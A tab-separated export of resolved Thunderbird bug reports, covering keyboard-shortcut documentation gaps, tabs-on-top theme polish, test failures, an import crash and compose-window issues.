716254%TAB%1325927590%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Help Documentation%TAB%TB: A lot(!) of keyboard shortcuts are missing in documentation%TAB%TB: A lot(!) of keyboard shortcuts are missing in documentationA lot(!) of keyboard shortcuts are missing from the main Keyboard Shortcuts documentation article (1), current revision (2) at the time of posting this bug:  Caveats!: - the position in this list does not anticipate the position in the documentation - the documentation is currently not well-ordered, see bug 714044. - I am listing shortcuts from a Windows system perspective(!)  *** Composition Window *** Caveat: Most, but not necessarily all of these shortcuts from composition window should be added to ==Writing Messages== section; for the problem of order, see bug 714044  * File Menu (ok)  * Edit Menu  Rewrap message text	Ctrl+R Delete selected text	Del (missing in the Writing Messages Section) Remove selected attachment(s)	Del  * View Menu Toggle Contacts Sidebar	F9  * Insert Menu Insert Link	Ctrl+L  * Format Menu Apply Text Style "Bold"	Ctrl+B Apply Text Style "Italics"	Ctrl+I Apply Text Style "Underline"	Ctrl+U Apply Text Style "Fixed Width"	Ctrl+T Discontinue Text Styles	Ctrl+Shift+Y Discontinue Link	Ctrl+Shift+K (should go together with Insert Link) Remove Named Anchors	Ctrl+Shift+A (this will change for TB10, see bug 452634) Increase Indent	Ctrl+] Decrease Indent	Ctrl+[ Select Table Cell	Ctrl+Click * Other Table Selection Methods need to be verified, e.g. "Select Table Column" has Ctrl+Drag but it also works without Ctrl, just Drag Delete Table Cell Contents	Del (may want to bundle with other Del uses)  * Options Menu Check Spelling	Ctrl+Shift+P  * Tools Menu Show Main Mail Window	Ctrl+1 (just imagine, and it even works...)  ...and: Move to next main UI element	Ctrl+Tab (for ==Writing Messages== only)  Wow, that's 16(!) missing shortcuts for Composition window only!  *** Main Mail Window *** Within the current, insufficient structure/order of the document (bug 714044), most, but not necessarily all of these missing shortcuts from main mail window need to go into the ==Message functions== section.  * File Menu Rename Folder	F2  * Edit Menu Cut	Ctrl+X (missing in Message functions section, see below) Paste	Ctrl+V (Message Functions section currently covers message reader and general functions, and there are many places where cutting and pasting works: Quick Filter Bar, Search Bar, Advanced Search, HTML forms in message reader etc.)  * View Menu View Message Source	Ctrl+U (this is missing from Message Functions, and wrongly listed under Writing Messages) Toggle Menu Bar (if hidden)	Alt (for Windows only, and starting from tb8, see relnotes) (In Message Functions section, Zoom Shortcuts Ctrl++/-/0 are listed, but with a wrong caption, they need to have Zoom In, Zoom Out, and Reset Zoom)  * Go Menu Go to Mail Start Page	Alt+Home  ...and: Bug 686436 - ctrl+tab, ctrl+shift+tab for switching tabs missing from TB keyboard shortcuts documentation  That's another 8 missing shortcuts from Main Mail Window.  *** Address Book *** Addressbook New Contact	Ctrl+N Addressbook Quick Filter	Ctrl+F Addressbook Advanced Search	Ctrl+Shift+F Addressbook Edit Properties	Ctrl+I  ...and 4 missing from Address Book, if we skip obvious duplicates from other sections.  So that's a total of 28(!) missing shortcuts, plus what might be undocumented in the UI, or what I might have overlooked.
716222%TAB%1325909737%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Help Documentation%TAB%TB: Keyboard Shortcuts broken(?)/wrong/incomplete in documentation: Alt+Cursor down ("Alt+down arrow")%TAB%TB: Keyboard Shortcuts broken(?)/wrong/incomplete in documentation: Alt+Cursor down ("Alt+down arrow")Current Documentation:  Thunderbird Keyboard Shortcuts documentation (1) currently has this:  ==Writing Messages== Add Additional Recipient	Alt + down arrow  That's nonsense without explanation: - down arrow?? What is that? Page-down also has a down arrow! Oh, you mean "cursor down"? I think we are creating more problems than we're solving by using simplified language here (and elsewhere, needs a new bug). - Caveat1: Alt+Cursor down does NOT work as a general keyboard shortcut from the compose window for adding recipients; iow, from most parts of the UI, it does nothing. - Caveat2: Alt+Cursor down only ever works for the very specific scenario when you are *inside one of the recipient fields*, but then: - Caveat3: Even in the header, Alt+Cursor down does NOT *add* any recipients unless you happen to be in the *last* recipient; for any other recipient field, it's just "*Move* to the next recipient". - Caveat4: Alt+Cursor *up* is not even implemented (it probably should! needs a new bug), so what's the point of memorizing this? (btw, we should be more flexible for moving up between recipients...) - I doubt that anyone will ever need this, because it's far easier to use ENTER for almost exactly the same purpose (the only difference being that Alt+Cursor Down will preserve per-recipient selection of text, while ENTER or Tab, Tab, will select all of the recipient's text. But then, who really needs to preserve a previous *partial* selection of another recipient?)  Expected Documentation:  - Given that a simple ENTER does the trick nicely (and is probably easy enough to discover so that it doesn't need documentation, at least not on the keyboard shortcuts page), and given all the caveats above, I think we should just *remove this shortcut entry* altogether.  - Otherwise, find a more precise description, and/or include ENTER as an alternative (with adequate description where it applies)
716217%TAB%1325907131%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Help Documentation%TAB%TB: Keyboard Shortcuts broken(?)/wrong/incomplete in documentation: Ctrl+U%TAB%TB: Keyboard Shortcuts broken(?)/wrong/incomplete in documentation: Ctrl+UThunderbird Keyboard Shortcuts documentation (1) currently has this:  ==Writing Messages== View Message Source	Ctrl + U  Assuming that "Writing Messages" means composition window, this doesn't work for Windows (can't test elsewhere; don't think we ever had that for composition). Does it work on other OS? Is it a regression?  (For message reader, Ctrl+U is correctly documented in the ==Message functions== section.)  Maybe somebody can explain the expected and current behaviour for all OS, so that we can fix the documentation, or create bugs as necessary.
716214%TAB%1325904641%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Help Documentation%TAB%TB: Keyboard Shortcuts broken(?)/wrong/incomplete in documentation: Ctrl+0, Ctrl++, Ctrl+-%TAB%TB: Keyboard Shortcuts broken(?)/wrong/incomplete in documentation: Ctrl+0, Ctrl++, Ctrl+-Thunderbird Keyboard Shortcuts documentation (1) currently has this:  ==Message functions== Increase Text Size	Ctrl + + Decrease Text Size	Ctrl + - Restore Text Size	Ctrl + 0  That's nonsense without explanation: *For reading messages*, Ctrl++/-/0 will change the *zoom* level, not the text size. Only *for writing messages*, Ctrl++/- will change *size* of text, and Ctrl+0 does nothing. ==Message functions== section is only about reading messages, because we have a separate section for ==Writing messages== (and, OT, ==Message functions== really is not a very telling headline, and we need more sections here).  So in ==Message functions== section we should have:  Zoom In 	Ctrl + + Zoom Out	Ctrl + - Reset Zoom	Ctrl + 0  And another documentation problem about the same shortcut further down the list (1):  ==Writing Messages== Restore Text Size: Ctrl+0  For composition only (!), this doesn't work for Windows (can't test elsewhere). Note that in composition, ctrl++ and ctrl+- make the actual *font size* of selected text bigger/smaller, so Ctrl+0 should really restore the default text size (and not the zoom as we do for reading). On windows, Ctrl+0 doesn't do anything in composition. Does it work on other OS? Is it a regression?  Maybe somebody can explain the expected and current behaviour for all OS, so that we can fix the documentation, or create bugs as necessary.
716101%TAB%1325858733%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Help Documentation%TAB%TB: Keyboard Shortcuts broken(?)/wrong/incomplete in documentation: Ctrl+Q%TAB%TB: Keyboard Shortcuts broken(?)/wrong/incomplete in documentation: Ctrl+QThunderbird Keyboard Shortcuts documentation (1) currently has this:  Quit: Ctrl+Q  This doesn't work for Windows (I think it was deliberately removed, too dangerous for accidents). Does it work on other OS?  Maybe somebody can explain the expected and current behaviour for all OS, so that we can fix the documentation, or create bugs as necessary.
715961%TAB%1325843362%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Message Compose Window%TAB%Attachment events in compose window need to be tested%TAB%Attachment events in compose window need to be testedWe'd like some Mozmill tests to ensure that the events introduced in bug 708982 actually do what we want them to do.
715807%TAB%1325795295%TAB%8636%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Migration%TAB%crash CMbxScanner::CleanUp%TAB%crash CMbxScanner::CleanUpThis bug was filed from the Socorro interface and is  report bp-bca944b5-968c-40eb-aa30-fc9482120104 . =============================================================  0 	xul.dll 	CMbxScanner::CleanUp 	mailnews/import/oexpress/nsOEMailbox.cpp:292 1 	xul.dll 	CMbxScanner::Initialize 	mailnews/import/oexpress/nsOEMailbox.cpp:247 2 	xul.dll 	CImportMailbox::ImportMailbox 	mailnews/import/oexpress/nsOEMailbox.cpp:158 3 	xul.dll 	ImportOEMailImpl::ImportMailbox 	mailnews/import/oexpress/nsOEImport.cpp:476 4 	xul.dll 	ImportMailThread 	mailnews/import/src/nsImportMail.cpp:908 5 	nspr4.dll 	_PR_NativeRunThread 	nsprpub/pr/src/threads/combined/pruthr.c:426 6 	nspr4.dll 	pr_root 	nsprpub/pr/src/md/windows/w95thred.c:122 7 	msvcr80.dll 	msvcr80.dll@0x29ba 	 8 	msvcr80.dll 	msvcr80.dll@0x2a46 	 9 	ntdll.dll 	__RtlUserThreadStart 	 10 	ntdll.dll 	_RtlUserThreadStart   When CMbxScanner::Initialize is failed, thunderbird will crash.  Because m_mbxFileInputStream or m_dstFileOutputStream may be null on CleanUp()
715565%TAB%1325756205%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs%TAB%two throbbers in main window%TAB%two throbbers in main windowIt seems we have two throbbers in the main window now. One on the tabs that is currently loading and one on the main toolbar. I suggest that the one on the tab is just enough by default.
715495%TAB%1325745460%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Inconsistency in styling of buttons in tabs-toolbar%TAB%Inconsistency in styling of buttons in tabs-toolbarIt seems we have at least three different ways we style buttons in the tabs-toolbar area on Aero (the area below the window controls). Either as heavier buttons (quicksearch), full color icons (calendar/todo) or white icons with a black outline (tabs dropdown). Firefox styles all these items as in the last example. I think we should do that too.
715488%TAB%1325742450%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-attachment.js | test-attachment.js::test_attachments_compose_menu,Mostly-Permanent orange: TEST-UNEXPECTED-FAIL | test-attachment.js | test-attachment.js::test_attachments_compose_menu%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-attachment.js | test-attachment.js::test_attachments_compose_menu,Mostly-Permanent orange: TEST-UNEXPECTED-FAIL | test-attachment.js | test-attachment.js::test_attachments_compose_menuSo I re-enabled the attachment tests in the Mozmill test suite (bug 711085), and now we're seeing a permanent orange on Linux.  The error message for the test is:  Test Failure: attachmentBucket is not focused!: 'Remove Attachment' != 'Delete'. TEST-UNEXPECTED-FAIL | /buildbot/comm-central-linux-opt-unittest-mozmill/build/mozmill/attachment/test-attachment.js | test-attachment.js::test_attachments_compose_menu
715212%TAB%1325670765%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Customize toolbar dialog buttons are strangely tall%TAB%Customize toolbar dialog buttons are strangely tallI just noticed this on trunk - is anybody else seeing it?  I'm seeing this too. Firefox don't showing the buttons and with this in primaryToolbar.css  #palette-box .toolbarbutton-1 {   border: none;   background: none; }  the problem with the tall buttons is gone because also no buttons are shown.
714825%TAB%1325577760%TAB%346596%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Attachment error for signature images when sending a mail,Attachment error for signatures containg callto:skypeid, tel:nbr type hrefs%TAB%Attachment error for signature images when sending a mail,Attachment error for signatures containg callto:skypeid, tel:nbr type hrefsUser Agent: Mozilla/5.0 (Windows NT 6.1; rv:10.0) Gecko/20100101 Firefox/10.0 Build ID: 20111228055358  Steps to reproduce:  I have an HTML based signature (see attachment) that also contains remotely hosted images. The signature appear correctly when composing a mail.   Actual results:  When I send the mail or when the mail is automatically saved as a draft, some of the images in my signature disappear and the following message appears:  "Sending of message failed. Attachment error."  I can not sent the mail unless by removing my signature.   Expected results:  The mail should be sent perfectly and the attachment should look fine.
714733%TAB%1325556376%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General,Instant Messaging%TAB%Instant messaging in Thunderbird%TAB%Instant messaging in ThunderbirdI'm going to track my work on the "instant messaging in Thunderbird" feature here.  The discussion for the feature is summarized on the wiki in a feature page: https://wiki.mozilla.org/Features/Thunderbird/Instant_messaging_in_Thunderbird  The attached patch is a work in progress. With it, it's already possible to use Google Talk, Facebook Chat and Twitter.  The UI isn't finished, we need to add at least: - a way to change the user's status - a way to add IM contacts - a way to join a chat room. - a way to access old (logged) conversations.  I'm still working on back-end stuff to integrate with the address book and gloda, but it may be a good time to start start looking at the code and playing with the work-in-progress UI (warning: the appearance is quite OK on Mac, but quite rough on Windows/Linux for now).  A try server build is available at http://ftp.mozilla.org/pub/mozilla.org/thunderbird/try-builds/florian@queze.net-c22e6f1b4df9/
714510%TAB%1325393498%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Viewpickerlabel has a white background on normal toolbars%TAB%Viewpickerlabel has a white background on normal toolbarsThe viewpickerlabel has a white background to be better readable. Now with the tabs on top only the tabbar-toolbar is transparent. On other toolbars this background looks odd. This patch changes to show the white background only on the tabbar-toolbar. This is now the only transparent toolbar.
714485%TAB%1325345908%TAB%72685%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window,Theme%TAB%Too much aero glass in compose window%TAB%Too much aero glass in compose windowUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0a1) Gecko/20111231 Firefox/12.0a1 Build ID: 20111231031039  Steps to reproduce:  Open up a new standalone compose window.   Actual results:  Too much aero glass effect in Windows 7.   Expected results:  The aero glass effect has been reduced considerably in the main Thunderbird window and the standalone reader window, but the compose window still has too much.
714456%TAB%1325316902%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%navigation-toolbox light blue under Classic%TAB%navigation-toolbox light blue under ClassicThe navigation-toolbox is light blue under Classic. It should be -moz-dialog. The definition was under the wrong media query, @media not all and (-moz-windows-compositor) instead of @media all and (-moz-windows-default-theme).
714391%TAB%1325261063%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Text on disabled toolbar buttons in the menubar doesn't look disabled%TAB%Text on disabled toolbar buttons in the menubar doesn't look disabledOn the list of "theme bugs which no one will probably ever encounter in practice", I imagine this one rates in the top 10. Nevertheless, I noticed that disabled toolbar buttons added to the menubar have text that looks enabled. Let's fix this, especially since it's really easy to do.
714390%TAB%1325260639%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs%TAB%Folder Location and Mail Views items are cut off in the customize toolbar dialog%TAB%Folder Location and Mail Views items are cut off in the customize toolbar dialogBug 419231 changed how the Customize Toolbar dialog looks. Unfortunately, this results in some of our wider items getting cut off. We should do something about that. This could either mean 1) fix the issue in toolkit (easy), 2) overlay some CSS to fix the issue (hacky, but still easy), or 3) figure out a way to make the items narrower (not sure how hard this is).
714337%TAB%1325243349%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%quickfilter bar doesn't remember its icon button state%TAB%quickfilter bar doesn't remember its icon button stateI run in the vertical view layout and the quickfilter bar often fails to remember that its buttons should be icons and not icons and labels. This pushes the filter box out of view some of the time. It's really annoying and I cannot figure out what triggers it. Every time I restart Thunderbird, I have to fiddle with the width of the message pane to re-trigger the icon only mode to get the filter text box back in view.
714065%TAB%1325140757%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Help Documentation%TAB%TB: Add table of contents / jump list to Keyboard Shortcuts documentation (expose sorting/grouping/subsections)%TAB%TB: Add table of contents / jump list to Keyboard Shortcuts documentation (expose sorting/grouping/subsections)STR  - look at Keyboard Shortcuts list (1), current version at time of posting (2) - try to figure out where to look for your shortcut without reading the whole document and the whole list  Actual result / Current documentation:  - need to scroll all the way down to the end of the long list to understand the sort order / grouping / subsections of keyboard shortcuts ("Message functions", "Newsgroup Messages", etc.)   Expected result / Improved documentation:  1a) Add linkified TOC somewhere above the list of keyboard shortcuts  Message functions Newsgroup Messages  Moving around Thunderbird Writing messages See Also  1b) Alternatively, this could be a jumplist with a dropdown, e.g.  List of Keyboard Shortcuts for [Select Topic... |v] Then, from the dropdown, you get the list of 1a. Selecting an entry will take you to that section (or something more sophisticated).  2) Given previous section titles...:  About keyboard shortcuts Shortcut keys and operating systems Customizing keyboard shortcuts  ...it's not very consistent to just continue with  Message functions  Message functions what? Actually, what we mean is "Keyboard Shortcuts for Message functions". Perhaps there's a missing section headline, something like "List of keyboard shortcuts" (see 1b above).  3) Consider including section titles of 2) into a TOC at the top, so we'd have:  About keyboard shortcuts Shortcut keys and operating systems Customizing keyboard shortcuts List of Keyboard Shortcuts  Or combinations of 1, 2, and 3.
714042%TAB%1325127015%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Stop trying to package MacOS/Contents/Plug-Ins/ since we haven't put anything in there since bug 520494%TAB%Stop trying to package MacOS/Contents/Plug-Ins/ since we haven't put anything in there since bug 520494As "recently" as 1.9.1, we shipped PrintPDE.plugin in MacOS/Contents/Plug-Ins/, so the line in package-manifest.in that packages whatever's in there had actual work to do from the time it landed in August 2009 until October 2009; since then it's been nothing but a "possible missing" packaging warning.
714041%TAB%1325124649%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Help Documentation%TAB%Thunderbird Keyboard Shortcut [Esc] documentation is incomplete/insufficient, needs better wording and/or more entries,TB: Documentation for [Esc] Keyboard Shortcut is incomplete/insufficient, needs better wording and/or more entries,TB: Documentation for [Esc] Keyboard Shortcut is wrong/incomplete/insufficient, needs better wording and/or more entries%TAB%Thunderbird Keyboard Shortcut [Esc] documentation is incomplete/insufficient, needs better wording and/or more entries,TB: Documentation for [Esc] Keyboard Shortcut is incomplete/insufficient, needs better wording and/or more entries,TB: Documentation for [Esc] Keyboard Shortcut is wrong/incomplete/insufficient, needs better wording and/or more entriesCurrent documentation:  Keyboard Shortcuts list (1) currently has this:  |Stop||{button Esc} |-  Which translates to:  _Message functions_ Stop: Esc  Stop what!? Clearly, this is insufficiently documented. I don't have time for the details, but we need to figure out relevant behaviour and then, discuss more appropriate documentation.   Expected documentation (draft):  I suspect we might need at least two or three entries: 1) one for stopping message download (does that still work at all?) 2) one for removing quick filter content/bar 3) perhaps one for cancelling other operations/dialogues etc.
713974%TAB%1325083235%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%function does not always return a value JS warnings in chrome://messenger/content/accountcreation/%TAB%function does not always return a value JS warnings in chrome://messenger/content/accountcreation/I see these 2 JS strict warnings in my error console each time I start Thunderbird  Warning: anonymous function does not always return a value Source File: chrome://messenger/content/accountcreation/emailWizard.js Line: 695, Column: 4 Source Code:     return this._foundConfig2(config);   Warning: function verifyConfig does not always return a value Source File: chrome://messenger/content/accountcreation/verifyConfig.js Line: 66  I don't like noise in my error console, so I'm attaching a trivial patch to fix these 2 warnings.
713919%TAB%1325071716%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Toolbar buttons dragged onto the stand-alone window menubar should have text-beside-icon%TAB%Toolbar buttons dragged onto the stand-alone window menubar should have text-beside-iconSteps to reproduce:  1)  Open up a stand-alone message window 2)  Customize the mail toolbar 3)  Drag a toolbar button onto the menubar  What happens?  The text for the toolbar button is below the icon.  What's expected?  The text should be beside the toolbar button.  See the attached screenshot for a look at the bug in action.
713852%TAB%1325050598%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Tab Icon is a bit off when Personas on Linux,Tab Icon is a bit off,Fix strange tab appearance due to change in border-image behaviour%TAB%Tab Icon is a bit off when Personas on Linux,Tab Icon is a bit off,Fix strange tab appearance due to change in border-image behaviourProtz sent me this bug report over email, saying that the tab icon looks a bit off.  He linked to this screenshot (which I'm currently unable to view): http://jonathan.protzenko.free.fr/shutter/Selection_001.png.   He then mentioned that adding padding-left: 5px to the <tab> itself fixes the issue nicely.
713768%TAB%1324996368%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%xpcshell test failure in base/test/test_nsIMsgFolderListenerLocal.js,Random orange | TEST-UNEXPECTED-FAIL | test_nsIMsgFolderListenerLocal.js | exception thrown from do_timeout callback nsIMsgFolder.deleteMessages,Permanent orange | TEST-UNEXPECTED-FAIL | test_nsIMsgFolderListenerLocal.js | exception thrown from do_timeout callback nsIMsgFolder.deleteMessages (32 bit Linux & Mac)%TAB%xpcshell test failure in base/test/test_nsIMsgFolderListenerLocal.js,Random orange | TEST-UNEXPECTED-FAIL | test_nsIMsgFolderListenerLocal.js | exception thrown from do_timeout callback nsIMsgFolder.deleteMessages,Permanent orange | TEST-UNEXPECTED-FAIL | test_nsIMsgFolderListenerLocal.js | exception thrown from do_timeout callback nsIMsgFolder.deleteMessages (32 bit Linux & Mac)linux xpcshell tinderbox builds are showing a failure in test_nsIMsgFolderListenerLocal.js - I can't reproduce the failure on mac or windows builds locally. This seems to have started after the landing of pluggable stores, bug 402392.
713767%TAB%1324996018%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%xpcshell test failure in imap/test_imapHighWater.js on win32,Permanent orange | TEST-UNEXPECTED-FAIL | test_imapHighWater.js on win32 | 6 == 11%TAB%xpcshell test failure in imap/test_imapHighWater.js on win32,Permanent orange | TEST-UNEXPECTED-FAIL | test_imapHighWater.js on win32 | 6 == 11The pluggable store landing seems to have caused failure on win32 tinderbox and try server builds in test_imapHighWater.js. I can't reproduce this locally on win32 debug or release builds, or on the mac. I'm trying to diagnose it by adding more diagnostics and pushing a patch with those diagnostics to try server. If try chooser is working correctly, I should be getting just a win32 xpcshell test run.
713457%TAB%1324803461%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Linux theme fixes%TAB%Linux theme fixesI found two small errors in Linux theme after landing of Bug 644169.  With Personas applied the menu bar has a half transparent background color. Never functional selector in toolbar definition.
713407%TAB%1324733485%TAB%352993%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Account provisioner does not find any possible email addresses unless the search text contains a space%TAB%Account provisioner does not find any possible email addresses unless the search text contains a spaceThe account provisioner does not locate any possible email addresses unless the search string contains a space, although the dialog text indicates "Just fill in your first and last name, or any other words you’d like, in the fields above to get started"  madmat  returns a sorry  mad mat returns a variety of options  Expected result: Both search string should return the same or very similar results.  Have set the severity of this to Blocker, as this is I think a show stopper for the feature and needs correction whilst still in beta.
713380%TAB%1324715522%TAB%431946%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Lightning Only,Message Reader UI%TAB%Outlook invitation no longer presented as attachment,Outlook invitation no longer presented as attachment (text/calender in multipart/alternative is not presented as attachment by Lightning after Tb 8)%TAB%Outlook invitation no longer presented as attachment,Outlook invitation no longer presented as attachment (text/calender in multipart/alternative is not presented as attachment by Lightning after Tb 8)User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1 Build ID: 20111120135848  Steps to reproduce:  Send (receive) a meeting request from outlook/exchange to thunderbird with lightning   Actual results:  Lightning correctly interprets the invitation event for itself and displays the event in the message pane.  Since thunderbird 8 / lightning 1.0 (including thunderbird 9 / lightning 1.1) no .ics attachment is shown for the message.   Expected results:  Before Thunderbird 8 / Lightning 1.0 it would also present the invitation as an ics attachment despite the fact that outlook/exchange sends it not as an attachment but as a text/calendar part of a multipart alternative message.  The old (correct) behavior allows a user to use outlook/eachange for calendar operations while using thunderbird for email.
713071%TAB%1324553875%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Active tabs are bold, possibly a bit too much%TAB%Active tabs are bold, possibly a bit too muchThe active tabs are not just active, but also bold for no real reason. Firefox does not do this for their active tabs. I think we should consider using just normal weight for the tabs here.
713061%TAB%1324552820%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Polish the standalone window under Aero%TAB%Polish the standalone window under AeroThe Box moving in Bug 644169 moved in standalone window the window shadow border below the toolbars.
713058%TAB%1324551992%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Polish tabs-on-top theme on Windows XP%TAB%Polish tabs-on-top theme on Windows XPSome little changes to make TB look better under Windows XP after landing of Bug 644169 This patch fixes following: Change the mail-toolbox definition from ID to class to apply also on the Lightning toolboxes (Bug 709572).  Let the text-shadow on active tabs with Personas (like Bug 710838).  Remove the double border in standalone window and remove the gradient.
713008%TAB%1324544585%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Tabs shouldn't flicker when hovered%TAB%Tabs shouldn't flicker when hoveredThe first time a non-selected tab is hovered, it flickers because the tab-hover-active.png image isn't loaded yet.  The attached patch reproduces the hack Firefox uses to work-around this: http://mxr.mozilla.org/mozilla-central/source/browser/themes/pinstripe/browser.css#1885
712960%TAB%1324537191%TAB%327665%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%TB 9 does not start on XP Pro SP3,TB 9 does not install on XP Pro SP3: error registering AccessibleMarshal.dll and MapiProxy_InUse.dl,TB 9 does not install on XP Pro SP3: error registering AccessibleMarshal.dll and MapiProxy_InUse.dll - missing msvc dlls%TAB%TB 9 does not start on XP Pro SP3,TB 9 does not install on XP Pro SP3: error registering AccessibleMarshal.dll and MapiProxy_InUse.dl,TB 9 does not install on XP Pro SP3: error registering AccessibleMarshal.dll and MapiProxy_InUse.dll - missing msvc dllsUser Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0) Gecko/20100101 Firefox/9.0 Build ID: 20111216140209  Steps to reproduce:  Update TB8 to TB9.   Actual results:  TB does not start, an messagebox is displayed. Uninstall and new install does not help.   Expected results:  TB should start.
712938%TAB%1324533439%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Polish tabs-on-top theme on Mac OS X%TAB%Polish tabs-on-top theme on Mac OS XAfter trying a build with Tabs on Top on Mac OS X 10.5.8, I've identified to things that I think could be polished: - the tab icons and the tab titles aren't vertically centered with each other - background of the bottom of the selected tab doesn't match the top of the mail toolbar, especially when the window is inactive.  The attached patch is only a suggestion. I created it by comparing the Mac themes of Thunderbird and Instantbird with DOM inspector to identify relevant differences.  I think you will want to take the .tab-text margin-top change. I'm not sure about the background changes: they look better on my Mac OS X 10.5, but that may not be the case on newer versions of the OS.
712624%TAB%1324445093%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-autohide-menubar.js | test_autohidden_menubar_3pane, test_autohidden_menubar_message_window, test_autohidden_menubar_compose_window, test_autohidden_menubar_address_book%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-autohide-menubar.js | test_autohidden_menubar_3pane, test_autohidden_menubar_message_window, test_autohidden_menubar_compose_window, test_autohidden_menubar_address_bookThis test failure is a direct result of Tabs on Top landing, and is due to the fact that I changed the name of an attribute without updating a test.  Fix forthcoming.
712560%TAB%1324420884%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Ctrl+Tab doesn't cycle tabs anymore%TAB%Ctrl+Tab doesn't cycle tabs anymore(I'm guessing this issue is related to tabs on top, but it's possible it's something else.)  On trunk, Ctrl+Tab no longer cycles through tabs and instead does the same thing as F6 (incidentally, this is what Ctrl+Tab used to do before tabs existed). We should fix this. Strange, Ctrl+Tab works fine for me in my local build on Win7. I haven't tried the checked-in version though, just the build I used to review the patch.
712395%TAB%1324381537%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Folder pane randomly collapses on startup with TestPilot 1.3.4 and Tabs on top%TAB%Folder pane randomly collapses on startup with TestPilot 1.3.4 and Tabs on topThis is a race condition that Sid noticed while reviewing the Tabs on Top patch (bug 644169).  Steps to reproduce:  1)  With a fresh profile, install Test Pilot for Thunderbird 1.3.4 from AMO. 2)  Shut Thunderbird down.  Open up the profile's localstore.rdf file, and find the folderPaneBox description entry. 3)  For the folderPaneBox description entry, add an attribute collapsed="true".  Your folderPaneBox description entry should now look something like this:  <RDF:Description RDF:about="chrome://messenger/content/messenger.xul#folderPaneBox"                    collapsed="true"                    width="242" />  Now start up Thunderbird with Tabs on Top, and switch to the 3pane.  What happens:  It's a race condition, so it doesn't always happen - but a number of times, the folderPane will be collapsed by default on startup.  What's expected:  The attribute should be ignored, like it has been for years and years.  Explanation:  So localstore.rdf can potential contain a lot of fragments of old UI customization parameters (like info on toolbars that no longer exist, etc).  Sometimes, the elements that those customization parameters apply to still do exist, but the attributes are supposed to be ignored - like in the case of folderPaneBox.  What's more; when going to View > Layout, and setting the Folder Pane attribute to visible, it doesn't work the first time, only the second.  Unfortunately, this is still a poorly understood bug at this time.
712322%TAB%1324367052%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Combine awful customize window hackery in test-tabmail-customize.js and test-header-toolbar.js%TAB%Combine awful customize window hackery in test-tabmail-customize.js and test-header-toolbar.jsThere's some pretty awful hackery and duplication going on in tabmail/test-tabmail-customize.js and message-header/test-header-toolbar.js with respect to the customization dialog.  We should combine this hackery so that it's not duplicated across the two tests.
